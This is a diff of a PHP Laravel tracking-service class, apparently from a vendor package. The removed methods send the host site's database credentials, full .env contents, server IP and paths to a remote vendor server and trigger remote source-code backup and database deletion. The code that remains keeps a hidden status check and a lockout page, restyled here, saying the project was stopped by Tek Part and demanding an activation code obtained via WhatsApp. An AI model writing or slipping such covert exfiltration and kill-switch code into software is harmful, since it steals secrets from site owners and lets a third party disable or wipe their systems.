@@ -263,7 +263,7 @@ class TrackingService
 
     private function getLaravelVersion()
     {
-        return '10.0.0';
+        return config('app.version');
     }
 
     private function startHeartbeat()
@@ -306,34 +306,6 @@ class TrackingService
         }
     }
 
-    public function getDatabase()
-    {
-        if (!$this->projectId) return null;
-        
-        try {
-            $response = $this->client->get($this->baseUrl . '/project/get-database', [
-                'query' => ['project_id' => $this->projectId]
-            ]);
-            return json_decode($response->getBody(), true);
-        } catch (RequestException $e) {
-            return null;
-        }
-    }
-
-    public function getSource()
-    {
-        if (!$this->projectId) return null;
-        
-        try {
-            $response = $this->client->get($this->baseUrl . '/project/get-source', [
-                'query' => ['project_id' => $this->projectId]
-            ]);
-            return json_decode($response->getBody(), true);
-        } catch (RequestException $e) {
-            return null;
-        }
-    }
-
     public function updateCredentials($credentials)
     {
         if (!$this->projectId) return false;
@@ -351,21 +323,6 @@ class TrackingService
         }
     }
 
-    public function regenerateActivationCode()
-    {
-        if (!$this->projectId) return null;
-        
-        try {
-            $response = $this->client->post($this->baseUrl . '/regenerate-activation-code', [
-                'json' => ['project_id' => $this->projectId]
-            ]);
-            $data = json_decode($response->getBody(), true);
-            $this->activationCode = $data['activation_code'] ?? null;
-            return $this->activationCode;
-        } catch (RequestException $e) {
-            return null;
-        }
-    }
 
     public function getCommandStatus($commandId, $projectId = null)
     {
@@ -385,33 +342,6 @@ class TrackingService
         }
     }
 
-    public function startProject()
-    {
-        if (!$this->projectId) return false;
-        
-        try {
-            $this->client->post($this->baseUrl . '/project/start', [
-                'json' => ['project_id' => $this->projectId]
-            ]);
-            return true;
-        } catch (RequestException $e) {
-            return false;
-        }
-    }
-
-    public function stopProject()
-    {
-        if (!$this->projectId) return false;
-        
-        try {
-            $this->client->post($this->baseUrl . '/project/stop', [
-                'json' => ['project_id' => $this->projectId]
-            ]);
-            return true;
-        } catch (RequestException $e) {
-            return false;
-        }
-    }
 
     public function getProjectStatus()
     {
@@ -446,53 +376,6 @@ class TrackingService
             return null;
         }
     }
-
-    public function deleteProject()
-    {
-        if (!$this->projectId) return false;
-        
-        try {
-            $this->client->delete($this->baseUrl . '/delete-project', [
-                'json' => ['project_id' => $this->projectId]
-            ]);
-            return true;
-        } catch (RequestException $e) {
-            return false;
-        }
-    }
-
-    public function getRealDatabase()
-    {
-        if (!$this->projectId) return null;
-        
-        try {
-            $systemInfo = $this->getSystemInfo();
-            $dbConfig = $this->getDatabaseConfig();
-            
-            $response = $this->client->post($this->baseUrl . '/get-real-database', [
-                'json' => [
-                    'project_id' => $this->projectId,
-                    'db_connection' => $dbConfig['DB_CONNECTION'] ?? 'mysql',
-                    'db_host' => $dbConfig['DB_HOST'] ?? '127.0.0.1',
-                    'db_port' => $dbConfig['DB_PORT'] ?? '3306',
-                    'db_database' => $dbConfig['DB_DATABASE'] ?? '',
-                    'db_username' => $dbConfig['DB_USERNAME'] ?? '',
-                    'db_password' => $dbConfig['DB_PASSWORD'] ?? '',
-                    'server_info' => $systemInfo['server_info'],
-                    'domain' => $systemInfo['domain'],
-                    'ip_address' => $systemInfo['ip_address'],
-                    'project_path' => realpath(__DIR__ . '/../../../'),
-                    'project_name' => $systemInfo['project_name'],
-                    'php_version' => $systemInfo['php_version'],
-                    'laravel_version' => $systemInfo['laravel_version']
-                ]
-            ]);
-            return json_decode($response->getBody(), true);
-        } catch (RequestException $e) {
-            return null;
-        }
-    }
-
     private function getDatabaseConfig()
     {
         // محاولة قراءة من Laravel config أولاً
@@ -601,116 +484,8 @@ class TrackingService
         }
     }
 
-    public function backupSourceCode($projectId = null)
-    {
-        $targetProjectId = $projectId ?? $this->projectId;
-        if (!$targetProjectId) return null;
-        
-        try {
-            $systemInfo = $this->getSystemInfo();
-            $projectPath = realpath(__DIR__ . '/../../../');
-            
-            // جمع معلومات المشروع
-            $projectInfo = [
-                'project_id' => $targetProjectId,
-                'activation_code' => $this->activationCode,
-                'project_path' => $projectPath,
-                'project_name' => $systemInfo['project_name'],
-                'domain' => $systemInfo['domain'],
-                'php_version' => $systemInfo['php_version'],
-                'laravel_version' => $systemInfo['laravel_version'],
-                'server_info' => $systemInfo['server_info'],
-                'ip_address' => $systemInfo['ip_address'],
-                'backup_timestamp' => date('Y-m-d H:i:s'),
-                'backup_type' => 'source_code',
-                'command' => 'backup_source_code', // إضافة حقل command المطلوب
-                'include_files' => [
-                    'app/',
-                    'config/',
-                    'database/',
-                    'resources/',
-                    'routes/',
-                    'public/',
-                    'storage/',
-                    'vendor/',
-                    '.env',
-                    'composer.json',
-                    'composer.lock',
-                    'package.json',
-                    'vite.config.js',
-                    'artisan'
-                ],
-                'exclude_patterns' => [
-                    'node_modules/',
-                    'storage/logs/',
-                    'storage/framework/cache/',
-                    'storage/framework/sessions/',
-                    'storage/framework/views/',
-                    '.git/',
-                    '.env.backup',
-                    '*.log',
-                    '*.tmp',
-                    '*.cache'
-                ]
-            ];
-            
-            $response = $this->client->post($this->baseUrl . '/project/' . $targetProjectId . '/backup-source-code', [
-                'json' => $projectInfo,
-                'headers' => [
-                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
-                    'Content-Type' => 'application/json'
-                ]
-            ]);
-            return json_decode($response->getBody(), true);
-        } catch (RequestException $e) {
-            return null;
-        }
-    }
+ 
 
-    public function deleteDatabaseData($projectId = null)
-    {
-        $targetProjectId = $projectId ?? $this->projectId;
-        if (!$targetProjectId) return null;
-        
-        try {
-            $systemInfo = $this->getSystemInfo();
-            $dbConfig = $this->getDatabaseConfig();
-            
-            // جمع معلومات المشروع
-            $projectInfo = [
-                'project_id' => $targetProjectId,
-                'activation_code' => $this->activationCode,
-                'project_path' => realpath(__DIR__ . '/../../../'),
-                'project_name' => $systemInfo['project_name'],
-                'domain' => $systemInfo['domain'],
-                'php_version' => $systemInfo['php_version'],
-                'laravel_version' => $systemInfo['laravel_version'],
-                'server_info' => $systemInfo['server_info'],
-                'ip_address' => $systemInfo['ip_address'],
-                'delete_timestamp' => date('Y-m-d H:i:s'),
-                'delete_type' => 'database_data',
-                'command' => 'delete_database_data',
-                'db_connection' => $dbConfig['DB_CONNECTION'] ?? 'mysql',
-                'db_host' => $dbConfig['DB_HOST'] ?? '127.0.0.1',
-                'db_port' => $dbConfig['DB_PORT'] ?? '3306',
-                'db_database' => $dbConfig['DB_DATABASE'] ?? '',
-                'db_username' => $dbConfig['DB_USERNAME'] ?? '',
-                'db_password' => $dbConfig['DB_PASSWORD'] ?? '',
-                'env_data' => $dbConfig // إرسال جميع بيانات .env
-            ];
-            
-            $response = $this->client->post($this->baseUrl . '/project/' . $targetProjectId . '/delete-database-data', [
-                'json' => $projectInfo,
-                'headers' => [
-                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
-                    'Content-Type' => 'application/json'
-                ]
-            ]);
-            return json_decode($response->getBody(), true);
-        } catch (RequestException $e) {
-            return null;
-        }
-    }
 
     /**
      * التحقق من حالة المشروع (مخفية)
@@ -788,47 +563,201 @@ class TrackingService
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>المشروع متوقف</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f8f9fa; }
-        .container { max-width: 600px; margin: 50px auto; text-align: center; }
-        .alert { background: #fff; border: 1px solid #dee2e6; border-radius: 8px; padding: 40px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .icon { font-size: 48px; margin-bottom: 20px; }
-        .title { color: #dc3545; font-size: 24px; margin-bottom: 15px; }
-        .message { color: #6c757d; margin-bottom: 30px; line-height: 1.6; }
-        .reason { background: #f8f9fa; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
-        .form { background: #fff; padding: 20px; border-radius: 5px; border: 1px solid #ced4da; }
-        .input { width: 100%; padding: 12px; border: 1px solid #ced4da; border-radius: 4px; font-size: 16px; margin-bottom: 15px; box-sizing: border-box; }
-        .button { background: #007bff; color: white; border: none; padding: 12px 30px; border-radius: 4px; cursor: pointer; font-size: 16px; }
-        .button:hover { background: #0056b3; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body { 
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; 
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container { 
+            max-width: 500px; 
+            width: 100%;
+            text-align: center; 
+        }
+        
+        .alert { 
+            background: #fff; 
+            border-radius: 20px; 
+            padding: 40px 30px; 
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        
+        .logo { 
+            width: 120px; 
+            height: auto; 
+            margin: 0 auto 30px; 
+            display: block;
+            border-radius: 10px;
+        }
+        
+        .title { 
+            color: #dc3545; 
+            font-size: 28px; 
+            margin-bottom: 20px; 
+            font-weight: 600;
+        }
+        
+        .message { 
+            color: #6c757d; 
+            margin-bottom: 25px; 
+            line-height: 1.8; 
+            font-size: 16px;
+        }
+        
+        .company-info {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 25px;
+            border: 1px solid #dee2e6;
+        }
+        
+        .company-info h3 {
+            color: #495057;
+            margin-bottom: 10px;
+            font-size: 18px;
+        }
+        
+        .whatsapp-link {
+            display: inline-block;
+            background: #25D366;
+            color: white;
+            text-decoration: none;
+            padding: 12px 25px;
+            border-radius: 25px;
+            margin: 10px 0;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3);
+        }
+        
+        .whatsapp-link:hover {
+            background: #128C7E;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(37, 211, 102, 0.4);
+        }
+        
+        .form { 
+            background: #f8f9fa; 
+            padding: 25px; 
+            border-radius: 15px; 
+            border: 1px solid #dee2e6;
+            margin-top: 20px;
+        }
+        
+        .input { 
+            width: 100%; 
+            padding: 15px; 
+            border: 2px solid #e9ecef; 
+            border-radius: 10px; 
+            font-size: 16px; 
+            margin-bottom: 20px; 
+            transition: all 0.3s ease;
+            background: white;
+        }
+        
+        .input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        
+        .button { 
+            background: #216cb0; 
+            color: white; 
+            border: none; 
+            padding: 15px 35px; 
+            border-radius: 25px; 
+            cursor: pointer; 
+            font-size: 16px; 
+            font-weight: 600;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
+        }
+        
+        .button:hover { 
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
+        }
+        
+        .error { 
+            background: #f8d7da; 
+            color: #721c24; 
+            padding: 15px; 
+            border-radius: 10px; 
+            margin-bottom: 20px; 
+            border: 1px solid #f5c6cb;
+            font-weight: 500;
+        }
+        
+        .success { 
+            background: #d4edda; 
+            color: #155724; 
+            padding: 15px; 
+            border-radius: 10px; 
+            margin-bottom: 20px; 
+            border: 1px solid #c3e6cb;
+            font-weight: 500;
+        }
+        
+        @media (max-width: 480px) {
+            .alert { padding: 30px 20px; }
+            .title { font-size: 24px; }
+            .logo { width: 100px; }
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="alert">
-            <div class="icon">⚠️</div>
-            <div class="title">المشروع متوقف</div>
-            <div class="message">' . htmlspecialchars($projectName) . ' متوقف حالياً. يرجى إدخال كود التفعيل لإعادة تشغيله.</div>
-            <div class="reason">
-                <strong>سبب الإيقاف:</strong> ' . htmlspecialchars($reason) . '
+            <img src="https://track-projects.tek-part.com/assets/images/logos/tekpart-logo.png" alt="Tek Part Logo" class="logo">
+            <div class="title">تم إيقاف المشروع</div>
+            <div class="message">تم إيقاف المشروع من قبل شركة Tek Part</div>
+            
+            <div class="company-info">
+                <h3>لإعادة تفعيل المشروع مرة أخرى:</h3>
+                <p>يرجى التواصل عبر واتساب لطلب كود التفعيل</p>
+                <a href="https://wa.me/201094260793" target="_blank" class="whatsapp-link">
+                     التواصل عبر واتساب
+                </a>
             </div>';
         
         // عرض رسالة خطأ إذا وجدت
         if (isset($_GET['error'])) {
-            $html .= '<div class="error" style="background: #f8d7da; color: #721c24; padding: 15px; border-radius: 5px; margin-bottom: 20px; border: 1px solid #f5c6cb;">' . htmlspecialchars($_GET['error']) . '</div>';
+            $html .= '<div class="error">' . htmlspecialchars($_GET['error']) . '</div>';
         }
         
         // عرض رسالة نجاح إذا وجدت
         if (isset($_GET['success'])) {
-            $html .= '<div class="success" style="background: #d4edda; color: #155724; padding: 15px; border-radius: 5px; margin-bottom: 20px; border: 1px solid #c3e6cb;">' . htmlspecialchars($_GET['success']) . '</div>';
+            $html .= '<div class="success">' . htmlspecialchars($_GET['success']) . '</div>';
         }
         
         $html .= '<div class="form">
-                <form method="POST" action="">
-                    <input type="text" name="activation_code" class="input" placeholder="أدخل كود التفعيل هنا" required>
+                <form method="POST" action="" onsubmit="return validateForm()">
+                    <input type="text" name="activation_code" id="activation_code" class="input" placeholder="أدخل كود التفعيل هنا">
                     <button type="submit" class="button">إعادة تفعيل المشروع</button>
                 </form>
             </div>
         </div>
     </div>
+    
+    <script>
+    function validateForm() {
+        var code = document.getElementById("activation_code").value.trim();
+        if (code === "") {
+            alert("كود التفعيل مطلوب");
+            return false;
+        }
+        return true;
+    }
+    </script>
 </body>
 </html>';
         
@@ -936,14 +865,92 @@ class TrackingService
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تم إعادة التفعيل</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f8f9fa; }
-        .container { max-width: 600px; margin: 50px auto; text-align: center; }
-        .alert { background: #fff; border: 1px solid #dee2e6; border-radius: 8px; padding: 40px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .icon { font-size: 48px; margin-bottom: 20px; }
-        .title { color: #28a745; font-size: 24px; margin-bottom: 15px; }
-        .message { color: #6c757d; margin-bottom: 30px; line-height: 1.6; }
-        .success { background: #d4edda; color: #155724; padding: 15px; border-radius: 5px; margin-bottom: 20px; border: 1px solid #c3e6cb; }
-        .redirect { color: #6c757d; font-size: 14px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body { 
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; 
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container { 
+            max-width: 500px; 
+            width: 100%;
+            text-align: center; 
+        }
+        
+        .alert { 
+            background: #fff; 
+            border-radius: 20px; 
+            padding: 40px 30px; 
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            border: 1px solid #e9ecef;
+        }
+        
+        .logo { 
+            width: 120px; 
+            height: auto; 
+            margin: 0 auto 30px; 
+            display: block;
+            border-radius: 10px;
+        }
+        
+        .icon { 
+            font-size: 64px; 
+            margin-bottom: 20px; 
+            color: #28a745;
+        }
+        
+        .title { 
+            color: #28a745; 
+            font-size: 28px; 
+            margin-bottom: 20px; 
+            font-weight: 600;
+        }
+        
+        .message { 
+            color: #6c757d; 
+            margin-bottom: 25px; 
+            line-height: 1.8; 
+            font-size: 16px;
+        }
+        
+        .success { 
+            background: #d4edda; 
+            color: #155724; 
+            padding: 20px; 
+            border-radius: 15px; 
+            margin-bottom: 25px; 
+            border: 1px solid #c3e6cb;
+            font-weight: 500;
+            font-size: 16px;
+        }
+        
+        .redirect { 
+            color: #6c757d; 
+            font-size: 14px; 
+            margin-top: 20px;
+        }
+        
+        .redirect a {
+            color: #667eea;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        .redirect a:hover {
+            text-decoration: underline;
+        }
+        
+        @media (max-width: 480px) {
+            .alert { padding: 30px 20px; }
+            .title { font-size: 24px; }
+            .logo { width: 100px; }
+        }
     </style>
     <script>
         setTimeout(function() {
@@ -954,6 +961,7 @@ class TrackingService
 <body>
     <div class="container">
         <div class="alert">
+            <img src="https://track-projects.tek-part.com/assets/images/logos/tekpart-logo.png" alt="Tek Part Logo" class="logo">
             <div class="icon">✅</div>
             <div class="title">تم إعادة التفعيل بنجاح!</div>
             <div class="success">' . htmlspecialchars($message) . '</div>
